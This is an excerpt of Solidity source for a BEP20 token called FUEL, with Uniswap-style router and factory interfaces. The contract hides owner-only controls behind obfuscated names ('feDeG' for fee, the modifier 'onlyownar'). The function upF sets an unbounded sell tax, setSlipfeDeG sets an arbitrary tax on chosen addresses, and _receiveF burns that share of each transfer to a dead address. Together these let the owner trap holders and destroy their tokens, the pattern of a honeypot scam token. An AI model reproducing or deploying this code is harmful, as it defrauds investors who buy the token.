...
interface IUniswapV2Factory {
    ...
    function feDeGTo() external view returns (address);
    function feDeGToSetter() external view returns (address);
    ...
    function setfeDeGTo(address) external;
    function setfeDeGToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeDeGOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeDeGOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeDeGOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeDeGOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeDeGOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract FUEL is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeDeG = 0;

    uint256 private _defaultBuyfeDeG = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeDeG;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeDeG = _value;
    }

    function setSlipfeDeG(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeDeG[_address] = _value;
    }

    function getSlipfeDeG(address _address) external view onlyownar returns (uint256) {
        return _slipfeDeG[_address];
    }


    function setMAccountfeDeG(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeDeG(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeDeGAmount = 0;

        if (rF) {
            uint256 tradefeDeG = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeDeG = _defaultSellfeDeG;
                }
                if (from == uniswapV2Pair) {

                    tradefeDeG = _defaultBuyfeDeG;
                }
            }
            if (_slipfeDeG[from] > 0) {
                tradefeDeG = _slipfeDeG[from];
            }

            tradefeDeGAmount = _Amount.mul(tradefeDeG).div(100);
        }


        if (tradefeDeGAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeDeGAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeDeGAmount);
            emit Transfer(from, _deadAddress, tradefeDeGAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeDeGAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeDeGAmount);
        emit Transfer(from, _to, _Amount - tradefeDeGAmount);
    }
